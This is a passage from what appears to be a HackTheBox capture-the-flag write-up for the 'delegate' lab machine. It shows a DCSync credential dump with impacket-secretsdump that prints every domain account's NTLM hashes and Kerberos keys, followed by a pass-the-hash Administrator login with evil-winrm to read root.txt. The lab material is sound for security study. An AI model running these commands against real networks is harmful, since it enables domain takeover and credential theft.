Finally, with the retrieved ticket, we can perform a DCSync attack, I'll use impacket secretsdump for this.

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate/krbrelayx]
└─$ KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache impacket-secretsdump -just-dc -k dc1.delegate.vl
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::
A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::
b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::
R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::
J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::
N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::
testpc$:4601:aad3b435b51404eeaad3b435b51404ee:d32616c7b926dfe07cb016555c0730cb:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f877adcb278c4e178c430440573528db38631785a0afe9281d0dbdd10774848c
Administrator:aes128-cts-hmac-sha1-96:3a25aca9a80dfe5f03cd03ea2dcccafe
Administrator:des-cbc-md5:ce257f16ec25e59e
krbtgt:aes256-cts-hmac-sha1-96:8c4fc32299f7a468f8b359f30ecc2b9df5e55b62bec3c4dcf53db2c47d7a8e93
krbtgt:aes128-cts-hmac-sha1-96:c2267dd0a5ddfee9ea02da78fed7ce70
krbtgt:des-cbc-md5:ef491c5b736bd04c
A.Briggs:aes256-cts-hmac-sha1-96:7692e29d289867634fe2c017c6f0a4853c2f7a103742ee6f3b324ef09f2ba1a1
A.Briggs:aes128-cts-hmac-sha1-96:bb0b1ab63210e285d836a29468a14b16
A.Briggs:des-cbc-md5:38da2a92611631d9
b.Brown:aes256-cts-hmac-sha1-96:446117624e527277f0935310dfa3031e8980abf20cddd4a1231ebf03e64fee8d
b.Brown:aes128-cts-hmac-sha1-96:13d1517adfa91fbd3069ed2dff04a41b
b.Brown:des-cbc-md5:ce407ac8d95ee6f2
R.Cooper:aes256-cts-hmac-sha1-96:786bef43f024e846c06ed7870f752ad4f7c23e9fdc21f544048916a621dbceef
R.Cooper:aes128-cts-hmac-sha1-96:8c6da3c96665937b96c7db2fe254e837
R.Cooper:des-cbc-md5:a70e158c75ba4fc1
J.Roberts:aes256-cts-hmac-sha1-96:aac061da82ae9eb2ca5ca5c4dd37b9af948267b1ce816553cbe56de60d2fa32c
J.Roberts:aes128-cts-hmac-sha1-96:fa3ef45e30cf44180b29def0305baeb6
J.Roberts:des-cbc-md5:6858c8d3456451f4
N.Thompson:aes256-cts-hmac-sha1-96:7555e50192c2876247585b1c3d06ba5563026c5f0d4ade2b716741b22714b598
N.Thompson:aes128-cts-hmac-sha1-96:7ad8c208f8ff8ee9f806c657afe81ea2
N.Thompson:des-cbc-md5:7cab43c191a7ecf2
DC1$:aes256-cts-hmac-sha1-96:358880cace9d6c849f2069f2ac7582b18de5185b3c815b6728cb3542c0d25fa1
DC1$:aes128-cts-hmac-sha1-96:f922407dfc023ec95d458257224ce8d9
DC1$:des-cbc-md5:9e16cd46ad54cba7
testpc$:aes256-cts-hmac-sha1-96:e4104df86c06c3f5871b97425e0ba9980b9b448617447ceb9a5faa69fb6cad88
testpc$:aes128-cts-hmac-sha1-96:18e27147b41026b714555752cb9fcf65
testpc$:des-cbc-md5:971094f2c49babdf
[*] Cleaning up...
```
We grab the hash of Administrator and authenticate with evil-winrm. There's our root.txt

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate/krbrelayx]
└─$ evil-winrm -i delegate.vl -u 'Administrator' -H c32198ceab4cc695e65045562aa3ee93
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          3/1/2026   6:30 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
3dc82a17a63.....
```
